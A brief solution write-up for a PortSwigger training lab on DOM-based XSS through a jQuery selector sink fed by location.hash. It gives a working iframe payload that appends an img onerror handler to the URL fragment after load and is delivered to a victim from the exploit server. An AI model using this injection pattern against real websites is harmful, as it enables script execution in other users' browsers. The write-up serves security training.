# Lab 20 — DOM XSS in jQuery selector sink using a hashchange event

> **Practitioner** · [Official lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)

**Entry point:** the home page's `hashchange` handler passes
`location.hash` into a jQuery `$()` selector sink.

## Solution

1. Deliver this iframe from the exploit server (auto-appends the payload to
   the fragment after load):

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#"
        onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

2. Viewing the exploit yourself confirms `print()`; deliver to victim —
   lab solved.

## Notes

The hashchange must fire *after* load — hence the append trick instead of a
static fragment.
